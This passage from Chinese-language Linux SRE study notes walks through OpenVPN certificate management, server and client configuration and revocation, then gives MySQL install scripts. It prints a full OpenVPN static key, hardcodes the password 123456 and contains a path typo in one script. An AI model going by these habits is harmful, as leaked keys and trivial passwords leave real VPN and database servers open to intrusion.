#查看给谁颁发的证书
[root@openvpn-server 3]# cat pki/index.txt
V	320516121852Z		CD6841B04445492E05B84A5A47FEA3ED	unknown	/CN=openvpn
V	221115133417Z		F7AAB72C34218A55C3121EC58A932A92	unknown	/CN=liusenbiao
V	221115134647Z		447EAE461451532B814EE4C5FC65FFE9	unknown	/CN=lujunhao


#9.将ca和服务器证书相关文件复制到服务器相应的目录
#实现证书的统一化管理
[root@openvpn-server 3]# mkdir /etc/openvpn/certs
[root@openvpn-server 3]# bash /root/openvpn_cp_certs.sh
#!/bin/bash
#
#********************************************************************
#Author: liusenbiao
#QQ: 1805336068
#Date: 2022-5-19
#FileName： openvpn-user-crt.sh
#URL: http://www.liusenbiao.com
#Description： The test script
#Copyright (C): 2020 All rights reserved
#********************************************************************
cd /etc/openvpn/easy-rsa-server/3
cp /etc/openvpn/easy-rsa-server/3/pki/ca.crt /etc/openvpn/certs/
cp /etc/openvpn/easy-rsa-server/3/pki/issued/server.crt /etc/openvpn/certs/
cp /etc/openvpn/easy-rsa-server/3/pki/private/server.key /etc/openvpn/certs/
cp /etc/openvpn/easy-rsa-server/3/pki/dh.pem /etc/openvpn/certs

[root@openvpn-server 3]# ll /etc/openvpn/certs/
total 20
-rw------- 1 root root 1176 May 19 22:04 ca.crt
-rw------- 1 root root  424 May 19 22:04 dh.pem
-rw------- 1 root root 4554 May 19 22:04 server.crt
-rw------- 1 root root 1704 May 19 22:04 server.key


#10.将客户端私钥与证书相关文件复制到服务器相关的目录
[root@openvpn-server 3]# mkdir /etc/openvpn/client/liusenbiao/
[root@openvpn-server 3]# find /etc/openvpn/ \( -name "liusenbiao.key" -o -name "liusenbiao.crt" -o -name ca.crt \) -exec cp {} /etc/openvpn/client/liusenbiao \;
[root@openvpn-server 3]# tree /etc/openvpn/client/liusenbiao/
/etc/openvpn/client/liusenbiao/
├── ca.crt
├── liusenbiao.crt
└── liusenbiao.key
0 directories, 3 files
```

### 34.4准备OpenVPN服务器配置文件

```
#0.服务器端配置文件说明
#server.conf文件中以#或;开头的行都为注释
[root@centos8 ~]#grep -Ev "^#|^$" /etc/openvpn/server.conf 
;local a.b.c.d  #本机监听IP,默认为本机所有IP
port 1194       #端口
;proto tcp      #协议,生产推荐使用TCP
proto udp #默认协议
;dev tap   #创建一个以太网隧道，以太网使用tap,一个tap设备允许完整的以太网帧通过Openvpn隧
道，可提供非ip协议的支持，比如IPX协议和AppleTalk协议,tap等同于一个以太网设备，它操作第二层数
据包如以太网数据帧。
dev tun    #创建一个路由IP隧道，生产推存使用tun.互联网使用tun,一个tun设备大多时候，被用于基
于IP协议的通讯。tun模拟了网络层设备，操作第三层数据包比如IP数据封包。
;dev-node MyTap  #TAP-Win32适配器。非windows不需要配置
ca ca.crt       #ca证书文件
cert server.crt  #服务器证书文件
key server.key   #服务器私钥文件
dh dh2048.pem    #dh参数文件
;topology subnet
server 10.8.0.0 255.255.255.0  #客户端连接后分配IP的地址池，服务器默认会占用第一个IP 
10.8.0.1将做为客户端的网关
ifconfig-pool-persist ipp.txt  #为客户端分配固定IP，不需要配置,建议注释
;server-bridge 10.8.0.4 255.255.255.0 10.8.0.50 10.8.0.100  #配置网桥模式，不需要配
置,建议注释
;server-bridge
;push "route 192.168.10.0 255.255.255.0"  #给客户端生成的到达服务器后面网段的静态路由，
下一跳为openvpn服务器的10.8.0.1
;push "route 192.168.20.0 255.255.255.0"  #推送路由信息到客户端，以允许客户端能够连接到
服务器背后的其它私有子网
;client-config-dir ccd #为指定的客户端添加路由，此路由通常是客户端后面的内网
网段而不是服务端的，也不需要设置
;route 192.168.40.128 255.255.255.248 
;client-config-dir ccd    
;route 10.9.0.0 255.255.255.252
;learn-address ./script                #运行外部脚本，创建不同组的iptables规则，无需配
置
;push "redirect-gateway def1 bypass-dhcp" #启用后，客户端所有流量都将通过VPN服务器，因
此生产一般无需配置此项
;push "dhcp-option DNS 208.67.222.222"   #推送DNS服务器，不需要配置
;push "dhcp-option DNS 208.67.220.220"
;client-to-client                       #允许不同的client直接通信,不安全,生产环境一般
无需要配置
;duplicate-cn                           #多个用户共用一个证书，一般用于测试环境，生产环
境都是一个用户一个证书,无需开启
keepalive 10 120         #设置服务端检测的间隔和超时时间，默认为每10秒ping一次，如果 120 
秒没有回应则认为对方已经down
tls-auth ta.key 0 #访止DoS等攻击的安全增强配置,可以使用以下命令来生成：openvpn --
genkey --secret ta.key #服务器和每个客户端都需要拥有该密钥的一个拷贝。第二个参数在服务器端应
该为’0’，在客户端应该为’1’
cipher AES-256-CBC  #加密算法
;compress lz4-v2    #启用Openvpn2.4.X新版压缩算法
;push "compress lz4-v2"   #推送客户端使用新版压缩算法,和下面的comp-lzo不要同时使用
;comp-lzo          #旧户端兼容的压缩配置，需要客户端配置开启压缩,openvpn2.4.X等新版可以不
用开启
;max-clients 100   #最大客户端数
;user nobody         #运行openvpn服务的用户和组
;group nobody
persist-key          #重启VPN服务时默认会重新读取key文件，开启此配置后保留使用第一次的key
文件,生产环境无需开启
persist-tun          #启用此配置后,当重启vpn服务时，一直保持tun或者tap设备是up的，否则会
先down然后再up,生产环境无需开启
status openvpn-status.log #openVPN状态记录文件，每分钟会记录一次
;log         openvpn.log   #第一种日志记录方式,并指定日志路径，log会在openvpn启动的时候
清空日志文件,不建议使用
;log-append openvpn.log   #第二种日志记录方式,并指定日志路径，重启openvpn后在之前的日志
后面追加新的日志,生产环境建议使用
verb 3                   #设置日志级别，0-9，级别越高记录的内容越详细,0 表示静默运行，只记
录致命错误,4 表示合理的常规用法,5 和 6 可以帮助调试连接错误。9 表示极度冗余，输出非常详细的日
志信息
;mute 20                 #相同类别的信息只有前20条会输出到日志文件中
explicit-exit-notify 1   #通知客户端，在服务端重启后自动重新连接，仅能用于udp模式，tcp模式
不需要配置即可实现断开重新连接,且开启此项后tcp配置后将导致openvpn服务无法启动,所以tcp时必须不
能开启此项


#1.修改服务器端配置文件
[root@openvpn-server 3]# vim /etc/openvpn/server.conf
port 1194
proto tcp
dev tun
ca /etc/openvpn/certs/ca.crt
cert /etc/openvpn/certs/server.crt
key /etc/openvpn/certs/server.key
dh /etc/openvpn/certs/dh.pem
server 10.8.0.0 255.255.255.0
push "route 172.30.0.0 255.255.255.0"
keepalive 10 120
cipher AES-256-CBC
compress lz4-v2
push "compress lz4-v2"
max-clients 2048
user openvpn
group openvpn
status /var/log/openvpn/openvpn-status.log
log-append /var/log/openvpn/openvpn.log
verb 3
mute 20
duplicate-cn #多个用户共享一个证书

#2.准备目志相关目录
[root@openvpn-server 3]# mkdir /var/log/openvpn
[root@openvpn-server 3]# chown openvpn.openvpn /var/log/openvpn
[root@openvpn-server 3]# ll -d /var/log/openvpn
drwxr-xr-x 2 openvpn openvpn 4096 May 19 22:30 /var/log/openvpn


#3.准备iptables规则和内核参数
#在服务器开启ip_forward转发功能
[root@openvpn-server 3]# echo net.ipv4.ip_forward = 1 >> /etc/sysctl.conf
[root@openvpn-server 3]# sysctl -p
#添加SNAT规则
[root@openvpn-server 3]# echo 'iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -j MASQUERADE' >> /etc/rc.d/rc.local
[root@openvpn-server 3]# chmod +x /etc/rc.d/rc.local
[root@openvpn-server 3]# /etc/rc.d/rc.local
[root@openvpn-server 3]# iptables -vnL -t nat
Chain POSTROUTING (policy ACCEPT 26 packets, 4782 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 MASQUERADE  all  --  *      *       10.8.0.0/24          0.0.0.0/0       


#4.启动OpenVPN服务
#centos7有/openvpn@.service文件，不需要创建
#centos8有/openvpn@.service文件，需要创建
[root@openvpn-server 3]# vim /usr/lib/systemd/system/openvpn@.service
[Unit]
Description=OpenVPN Robust And Highly Flexible Tunneling Application On %I
After=network.target

[Service]
Type=notify
PrivateTmp=true
ExecStart=/usr/sbin/openvpn --cd /etc/openvpn/ --config %i.conf

[Install]
WantedBy=multi-user.target
[root@openvpn-server ~]# systemctl daemon-reload
[root@openvpn-server ~]# systemctl enable --now openvpn@server
```

![1652975933963](linuxSRE.assets/1652975933963.png)

### 34.5准备OpenVPN客户端配置文件

```
#1.修改配置文件,内容如下
[root@openvpn-server ~]# vim /etc/openvpn/client/liusenbiao/client.ovpn
client
dev tun
proto tcp
remote 8.142.75.195 1194
resolv-retry infinite
nobind
#persist-key
#persist-tun
ca ca.crt
cert liusenbiao.crt
key liusenbiao.key
remote-cert-tls server
#tls-auth ta.key 1
cipher AES-256-CBC
verb 3 
compress lz4-v2
tls-auth ta.key 1
```

### 34.6Windows安装OpenVPN客户端

官方客户端下载地址：

https://openvpn.net/community-downloads/

![1652977354143](linuxSRE.assets/1652977354143.png)

保存证书到openvpn 客户端安装目录：D:\OpenVPN\config

```
[root@openvpn-server ~]# cd /etc/openvpn/client/liusenbiao/
[root@openvpn-server liusenbiao]# tar cf /root/liusenbiao.tar ./
tar: ./liusenbiao.tar: file is the archive; not dumped
[root@openvpn-server liusenbiao]# sz liusenbiao.tar
#解压，把里面的四个文件放到config里面
```

![1652979129866](linuxSRE.assets/1652979129866.png)

连接成功

![1653060400018](linuxSRE.assets/1653060400018.png)

**ping 172.30.0.200私有地址成功**

![1653060450349](linuxSRE.assets/1653060450349.png)

### 34.7OpenVPN 高级功能

#### 34.7.1防止DoS攻击

```
#1.启用防止DoS攻击的安全增强配置
[root@openvpn-server ~]# openvpn --genkey --secret /etc/openvpn/certs/ta.key
[root@openvpn-server ~]# ll /etc/openvpn/certs/
total 24
-rw------- 1 root root 1176 May 20 22:49 ca.crt
-rw------- 1 root root  424 May 20 22:49 dh.pem
-rw------- 1 root root 4554 May 20 22:49 server.crt
-rw------- 1 root root 1704 May 20 22:49 server.key
-rw------- 1 root root  636 May 20 23:31 ta.key
[root@openvpn-server ~]# cat /etc/openvpn/certs/ta.key 
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
02bbd533a6a8db5383ea9f96b034dc4c
d8cb364e9b4dffae6699ab03935f41be
f35f493040b02396874ca662eb3fbcdd
4ad6bfb9ee68b27c30becc33e491e6fa
7bdc0949c15c40d0be1157929a9d1bad
9d0d3e1d4b4346036d9589b62e567e32
c46e883de7ebfd7bf8954f7c58735904
9df59e05d8b907e297131e60c71888ab
8c2a61842398fcff648831c40ce8bc44
6a31c17fe8d95811cef3bb55cda9ef0e
fc3a1bb3285076eb6a91459616236699
83512f6a30232d06fa4fa017427143d9
f07e349485cbf72036dec90262b3026a
65deadd17306236dfb5dab5ac0b7bc9a
3944f7e42bcb8a7471f3b6ea00894737
f2ad1f073b71a64d074076787a9173f4
-----END OpenVPN Static key V1-----
[root@openvpn-server ~]# vim /etc/openvpn/server.conf
tls-auth /etc/openvpn/certs/ta.key 0  #客户端为1,服务器端为0
[root@openvpn-server ~]# systemctl restart openvpn@server.service
#windows客户端上修改openvpn的配置文件
tls-auth ta.key 1 #加上这行
[root@openvpn-server ~]# sz /etc/openvpn/certs/ta.key
ta.key文件拷贝到桌面，并放到D:\OpenVPN\config下
```

#### 34.7.2设置私钥密码

```
#2.1创建新用户,生成对应的有密码的私钥和证书申请
[root@openvpn-server ~]# cd /etc/openvpn/easy-rsa-client/3
[root@openvpn-server 3]# pwd
/etc/openvpn/easy-rsa-client/3
[root@openvpn-server 3]# ./easyrsa gen-req magedu
输入密码123456
[root@openvpn-server 3]# tree pki
pki
├── openssl-easyrsa.cnf
├── private
│   ├── liusenbiao.key
│   ├── lujunhao.key
│   └── magedu.key #创建新用户
├── reqs
│   ├── liusenbiao.req
│   ├── lujunhao.req
│   └── magedu.req #创建新用户
└── safessl-easyrsa.cnf
2 directories, 8 files

#2.2 导入证书申请并颁发证书
[root@openvpn-server 3]# cd /etc/openvpn/easy-rsa-server/3
[root@openvpn-server 3]# ./easyrsa import-req /etc/openvpn/easy-rsa-client/3/pki/reqs/magedu.req   magedu
ki/reqs/magedu.req   magedu
Using SSL: openssl OpenSSL 1.0.2k-fips  26 Jan 2017

The request has been successfully imported with a short name of:  
You may now use this name to perform signing operations on this request
[root@openvpn-server 3]# pwd
/etc/openvpn/easy-rsa-server/3
[root@openvpn-server 3]# vim vars
#把新人magedu的有效期改成30天
set_var EASYRSA_CERT_EXPIRE     30
#颁发证书
[root@openvpn-server 3]# ./easyrsa sign client magedu
[root@openvpn-server 3]# cat /etc/openvpn/easy-rsa-server/3/pki/index.txt
V	320517143446Z		D918B038F74C2677CE800EE2A67FE491	unknown	/CN=openvpn
V	320517144343Z		41B1DB8DC4812A1EF8BF8B07080F3E9C	unknown	/CN=liusenbiao
V	320517144842Z		E338471FBAC309EDC0528A8B12432A62	unknown	/CN=lujunhao
V	320518023518Z		1ED9BCE39731AC5E0EB8CACD9979DF01	unknown	/CN=magedu #新创建带有私钥密码的用户


#2.3 将用户的证书相关文件放在指定的目录中
[root@openvpn-server 3]# mkdir /etc/openvpn/client/magedu
[root@openvpn-server 3]# cp /etc/openvpn/easy-rsa-client/3/pki/private/magedu.key /etc/openvpn/client/magedu
[root@openvpn-server 3]# cp /etc/openvpn/certs/{ca.crt,dh.pem,ta.key} /etc/openvpn/client/magedu/
[root@openvpn-server 3]# cp /etc/openvpn/client/liusenbiao/client.ovpn /etc/openvpn/client/magedu/
[root@openvpn-server 3]# cp /etc/openvpn/easy-rsa-server/3/pki/issued/magedu.crt /etc/openvpn/client/magedu
[root@openvpn-server 3]# ls /etc/openvpn/client/magedu/
ca.crt  client.ovpn  dh.pem  magedu.crt  magedu.key  ta.key
[root@openvpn-server 3]# vim /etc/openvpn/client/magedu/client.ovpn
client
dev tun
proto tcp
remote 8.142.75.195 1194
resolv-retry infinite
nobind
ca ca.crt
cert magedu.crt
key magedu.key
remote-cert-tls server
cipher AES-256-CBC
verb 3
compress lz4-v2
tls-auth ta.key 1
[root@openvpn-server 3]# cd /etc/openvpn/client/magedu/
[root@openvpn-server magedu]# zip -e /root/magedu.zip ./*
Enter password: 
Verify password: 
  adding: ca.crt (deflated 26%)
  adding: client.ovpn (deflated 25%)
  adding: dh.pem (deflated 18%)
  adding: magedu.crt (deflated 45%)
  adding: magedu.key (deflated 24%)
  adding: ta.key (deflated 40%)
[root@openvpn-server magedu]# sz /root/magedu.zip
上传到桌面然后把里面的文件全部拷贝到windows下的/openVPN/config下
```

![1653103303588](linuxSRE.assets/1653103303588.png)

验证加密密钥是否成功

密码123456

![1653103349257](linuxSRE.assets/1653103349257.png)

加密成功

![1653103397495](linuxSRE.assets/1653103397495.png)

![1653103708495](linuxSRE.assets/1653103708495.png)

#### 34.7.3 证书自动过期吊销

```
#3.1 证书自动过期
[root@openvpn-server magedu]# date
Sat May 21 11:47:25 CST 2022
[root@openvpn-server magedu]# date -s '10 year'
Fri May 21 11:47:43 CST 2032
[root@openvpn-server magedu]# date
Fri May 21 11:47:55 CST 2032
[root@openvpn-server magedu]# clock -s #恢复成硬件时间
[root@openvpn-server magedu]# date
Sat May 21 11:48:56 CST 2022


#3.2 吊销指定的用户的证书
[root@openvpn-server magedu]# cd /etc/openvpn/easy-rsa-server/3
[root@openvpn-server 3]# cat pki/index.txt
V	320517143446Z		D918B038F74C2677CE800EE2A67FE491	unknown	/CN=openvpn
V	320517144343Z		41B1DB8DC4812A1EF8BF8B07080F3E9C	unknown	/CN=liusenbiao
V	320517144842Z		E338471FBAC309EDC0528A8B12432A62	unknown	/CN=lujunhao
V	320518023518Z		1ED9BCE39731AC5E0EB8CACD9979DF01	unknown	/CN=magedu
[root@openvpn-server 3]# ./easyrsa revoke magedu #吊销证书
[root@openvpn-server 3]# cat pki/index.txt
R	320518023518Z	220521035416Z	1ED9BCE39731AC5E0EB8CACD9979DF01     unknown	/CN=magedu    #R表示吊销证书


#3.3 生成证书吊销列表
#每次吊销证书后都需要更新证书吊销列表文件,并且需要重启OpenVPN服务
[root@openvpn-server magedu]# cd /etc/openvpn/easy-rsa-server/3
[root@openvpn-server 3]# ./easyrsa gen-crl


#3.4将吊销列表文件发布
#第一次吊销证时需要编辑配置文件调用吊销证书的文件,后续吊销无需此步
[root@openvpn-server 3]# vim /etc/openvpn/server.conf
#加上下面这一行
crl-verify /etc/openvpn/easy-rsa-server/3/pki/crl.pem
[root@openvpn-server 3]# !syst
systemctl restart openvpn@server.service

```

#### 34.7.4账户重名证书签发

```
假如公司已有员工叫magedu已经离职,且证书已被吊销，现在又新来一个员工仍叫magedu，那么一般的区分办法是在用户名后面加数字，如:magedu1、magedu2等，假如还想使用magedu这个账户名签
发证书的话，那么需要删除服务器之前magedu的账户，并删除签发记录和证书，否则新用户的证书无法导入，并重新颁发证书

# 自动化的证书颁发脚本
#!/bin/bash
#
#********************************************************************
#Author: liusenbiao
#QQ: 1805336068
#Date: 2022-5-19
#FileName： openvpn-user-crt.sh
#URL: http://www.liusenbiao.com
#Description： The test script
#Copyright (C): 2020 All rights reserved
#********************************************************************
. /etc/init.d/functions

OPENVPN_SERVER=8.142.75.195
PASS=123456

remove_cert() {
    touch heman.txt
    rm -rf /etc/openvpn/client/${NAME}
    find /etc/openvpn/ -name "$NAME.*" -delete
}

create_cert() {
    cd /etc/openvpn/easy-rsa-client/3
   ./easyrsa gen-req ${NAME} nopass <<EOF

EOF
    cd /etc/oprnvpn/easy-rsa-server/3
   ./easyrsa import-req /etc/openvpn/easy-rsa-client/3/pki/reqs/${NAME}.req ${NAME}
   ./easyrsa sign client ${NAME} <<EOF
yes
EOF
    mkdir /etc/openvpn/client/${NAME}
    cp /etc/openvpn/easy-rsa-server/3/pki/issued/${NAME}.crt /etc/openvpn/client/${NAME}
    cp /etc/openvpn/easy-rsa-client/3/pki/private/${NAME}.key /etc/openvpn/client/${NAME}
    cp /etc/openvpn/certs/{ca.crt,dh.pem,ta.key} /etc/openvpn/client/${NAME}
    cat > /etc/openvpn/client/${NAME}/client.ovpn <<EOF
client
dev tun
proto tcp
remote ${OPENVPN_SERVER} 1194
resolv-retry infinite
nobind
#persist-key
#persist-tun
ca ca.crt
cert $NAME.crt
key $NAME.key
remote-cert-tls server
tls-auth ta.key 1
cipher AES-256-CBC
verb 3
compress lz4-v2
EOF
    echo "证书存放路径:/etc/openvpn/client/${NAME},证书文件如下:"
    echo -e "\E[1;32m******************************************************************\E[0m"
    ls -l /etc/openvpn/client/${NAME}
    echo -e "\E[1;32m******************************************************************\E[0m"
    cd /etc/openvpn/client/${NAME}
    zip -qP "$PASS" /root/${NAME}.zip *
    action  "证书的打包文件已生成: /root/${NAME}.zip"
}   


read -p "请输入用户的姓名拼音(如:liusenbiao): " NAME

remove_cert
create_cert

[root@openvpn-server ~]# bash /root/openvpn-user-crt.sh
[root@openvpn-server ~]# sz /root/xiaohua
然后到windows下的openvpn/config端配置下即可!!!
```

### 34.8生产中常用配置文件

```
#server端配置文件
[root@openvpn-server 3]# vim /etc/openvpn/server.conf
port 1194
proto tcp
dev tun
ca /etc/openvpn/certs/ca.crt
cert /etc/openvpn/certs/server.crt
key /etc/openvpn/certs/server.key  # This file should be kept secret
dh /etc/openvpn/certs/dh.pem
server 10.8.0.0 255.255.255.0
push "route 172.30.0.0 255.255.0.0"
keepalive 10 120
tls-auth /etc/openvpn/certs/ta.key 0
cipher AES-256-CBC
compress lz4-v2
push "compress lz4-v2"
max-clients 2048
user openvpn
group openvpn
status /var/log/openvpn/openvpn-status.log
log-append /var/log/openvpn/openvpn.log
verb 3
mute 200
crl-verify /etc/openvpn/easy-rsa-server/3/pki/crl.pem


# client端配置文件
vim /etc/openvpn/client/liusenbiao/client.ovpn
client
dev tun
proto tcp
remote 10.0.0.8 1194
resolv-retry infinite
nobind
#persist-key
#persist-tun
ca ca.crt
cert magedu.crt
key magedu.key
remote-cert-tls server
tls-auth ta.key 1
cipher AES-256-CBC
verb 3
compress lz4-v2
```

## 35.MYSQL数据库

### 35.1mysql的安装

#### 35.1.1普通安装

```
#centos7安装
[21:22:51 root@centos7 ~]#yum -y install mariadb-server
#初始化密码等其他安全信息
[21:22:51 root@centos7 ~]#mysql_secure_installation
[09:30:36 root@centos7 ~]#mysqladmin -uroot -pliusenbiao password 123456   #修改密码


#centos8安装
[root@centos8 ~]# yum -y install mysql-server
#初始化密码等其他安全信息
[root@centos8 ~]# mysql_secure_installation
#修改配置文件
#持久修改mysql提示符
[root@centos8 ~]# cd /etc/my.cnf.d/
[root@centos8 my.cnf.d]# ls
client.cnf  mysql-default-authentication-plugin.cnf  mysql-server.cnf
[root@centos8 my.cnf.d]# vim mysql.cnf
[mysql]
prompt="\\r:\\m:\\s(\\u@\\h) [\\d]>\\_"
#最后mysql的效果
09:44:44(root@localhost) [mysql]> 


#ubuntu安装
[root@ubuntu1804]# sudo apt install mysql-server
#初始化密码等其他安全信息
[root@ubuntu1804]# mysql_secure_installation 
```

#### 35.1.2二进制安装

##### 35.1.2.1一键安装mysql-5.6

```
#1.离线安装mysql-5.6
#!/bin/bash
DIR=`pwd`
NAME="mysql-5.6.47-linux-glibc2.12-x86_64.tar.gz"
FULL_NAME=${DIR}/${NAME}
DATA_DIR="/data/mysql"

yum install -y libaio perl-Data-Dumper  
if [ -f ${FULL_NAME} ];then
    echo "安装文件存在"
else
    echo "安装文件不存在"
    exit 3
fi
if [ -h /usr/local/mysql ];then
    echo "Mysql 已经安装"
    exit 3
else
    tar xvf ${FULL_NAME}   -C /usr/local/src
    ln -sv /usr/local/src/mysql-5.6.47-linux-glibc2.12-x86_64 /usr/local/mysql
    if id mysql;then
        echo "mysql 用户已经存在，跳过创建用户过程"
    else
       useradd  -r   -s /sbin/nologin mysql
     fi

    if id mysql;then
        chown  -R mysql.mysql /usr/local/mysql/* 
        if [ ! -d /data/mysql ];then
            mkdir -pv /data/mysql && chown  -R mysql.mysql /data   -R
           /usr/local/mysql/scripts/mysql_install_db  --user=mysql --
datadir=/data/mysql  --basedir=/usr/local/mysql/
 cp /usr/local/src/mysql-5.6.47-linux-glibc2.12-x86_64/support-files/mysql.server /etc/init.d/mysqld
           chmod a+x /etc/init.d/mysqld
           cp ${DIR}/my.cnf   /etc/my.cnf
           ln -sv /usr/local/mysql/bin/mysql /usr/bin/mysql
           /etc/init.d/mysqld start
          chkconfig --add mysqld
          else
            echo "MySQL数据目录已经存在,"
            exit 3
         fi
    fi
fi

[root@centos8 ~]#cat /etc/my.cnf
[mysqld]
socket=/data/mysql.sock
user=mysql
symbolic-links=0
datadir=/data/mysql
innodb_file_per_table=1
[client]
port=3306
socket=/data/mysql.sock
[mysqld_safe]
log-error=/var/log/mysqld.log
pid-file=/tmp/mysql.sock
[root@centos8 ~]#ls
install_mysql5.6.sh my.cnf mysql-5.6.47-linux-glibc2.12-x86_64.tar.gz



#2.在线安装mysql-5.6
###################################################################
# File Name: install_mysql_online.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash

. /etc/init.d/functions
DIR=`pwd`
MYSQL_VERSION=5.6.51
NAME="mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64.tar.gz"
FULL_NAME=${DIR}/${NAME}
URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.6
DATA_DIR="/data/mysql"

rpm -q wget || yum -y -q install wget
wget $URL/$NAME || { action"下载失败,异常退出" false;exit 10; }
yum install -y -q libaio perl-Data-Dumper autoconf
if [ -f ${FULL_NAME} ];then
    action "安装文件存在"
else
    action "安装文件不存在" false
    exit 3
fi

if [ -e /usr/local/mysql ];then
   action "Mysql 已经安装" false
   exit 3
else
   tar xf ${FULL_NAME} -C /usr/local/src
   ln -sv /usr/local/src/mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64 /usr/local/mysql
   if id mysql;then
      action "mysql 用户已经存在，跳过创建用户过程"
   else
      useradd -r -s /sbin/nologin mysql
   fi

   if id mysql;then
       chown -R mysql.mysql /usr/local/mysql/*
       if [ ! -d /data/mysql ];then
         mkdir -pv /data/mysql && chown -R mysql.mysql /data
         /usr/local/mysql/scripts/mysql_install_db --user=mysql --datadir=/data/mysql --basedir=/usr/local/mysql/
         cp /usr/local/src/mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64/support-files/mysql.server /etc/init.d/mysqld
         chmod a+x /etc/init.d/mysqld
         cat > /etc/my.cnf << EOF
         [mysqld]
         socket=/data/mysql/mysql.sock
         user=mysql
         symbolic-links=0
         datadir=/data/mysql
         innodb_file_per_table=1
         [client]
         port=3306
         socket=/data/mysql/mysql.sock
         [mysqld_safe]
         log-error=/var/log/mysqld.log
         pid-file=/tmp/mysql.sock
EOF
          ln -sv /usr/local/mysql/bin/mysql /usr/bin/mysql
         /etc/init.d/mysqld start
         chkconfig --add mysqld
     else
         action "MySQL数据目录已经存在" false
         exit 3
     fi
  fi
fi
```

![1653211662444](linuxSRE.assets/1653211662444.png)

##### 35.1.2.2一键安装MySQL5.7and8.0

```
#1.离线安装MySQL5.7和MySQL8.0
###################################################################
# File Name: install_mysql5.7or8.0_offline.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash
. /etc/init.d/functions 
SRC_DIR=`pwd`
MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
#MYSQL='mysql-8.0.19-linux-glibc2.12-x86_64.tar.gz'
COLOR='echo -e \E[01;31m'
END='\E[0m'
MYSQL_ROOT_PASSWORD=123456

check (){

if [ $UID -ne 0 ]; then
  action "当前用户不是root,安装失败" false
  exit 1
fi

cd  $SRC_DIR
if [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
		$COLOR"请将相关软件放在${SRC_DIR}目录下"$END
        exit
elif [ -e /usr/local/mysql ];then
        action "数据库已存在，安装失败" false
        exit
else
	return
fi
} 

install_mysql(){
    $COLOR"开始安装MySQL数据库..."$END
	yum  -y -q install libaio numactl-libs   libaio &> /dev/null
    cd $SRC_DIR
    tar xf $MYSQL -C /usr/local/
    MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
    ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
    chown -R  root.root /usr/local/mysql/
    id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; action "创建mysql用户"; }
        
    echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/mysql.sh
    .  /etc/profile.d/mysql.sh
	ln -s /usr/local/mysql/bin/* /usr/bin/
    cat > /etc/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock                 
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql 
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
	sleep 3
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    action "数据库安装完成" 
}

check
install_mysql


#2.在线安装MySQL5.7和MySQL8.0
###################################################################
# File Name: install_mysql5.7or8.0_offline.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash
. /etc/init.d/functions
SRC_DIR=`pwd`
MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
#MYSQL='mysql-8.0.23-linux-glibc2.12-x86_64.tar.gz'
URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.7
#URL=http://mirrors.163.com/mysql/Downloads/MySQL-8.0

COLOR='echo -e \E[01;31m'
END='\E[0m'
MYSQL_ROOT_PASSWORD=123456


check (){

if [ $UID -ne 0 ]; then
  action "当前用户不是root,安装失败" false
  exit 1
fi

cd  $SRC_DIR
rpm -q wget || yum -y -q install wget
wget $URL/$MYSQL
if [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
        $COLOR"请将相关软件放在${SRC_DIR}目录下"$END
        exit
elif [ -e /usr/local/mysql ];then
        action "数据库已存在，安装失败" false
        exit
else
        return
fi
}

install_mysql(){
        $COLOR"开始安装MySQL数据库..."$END
        yum  -y -q install libaio numactl-libs
        cd $SRC_DIR
        tar xf $MYSQL -C /usr/local/
        MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
        ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
        chown -R  root.root /usr/local/mysql/
        id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; action "创建mysql用户"; }

        echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/mysql.sh
        .  /etc/profile.d/mysql.sh
        ln -s /usr/local/mysql/bin/* /usr/bin/
        cat > /etc/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
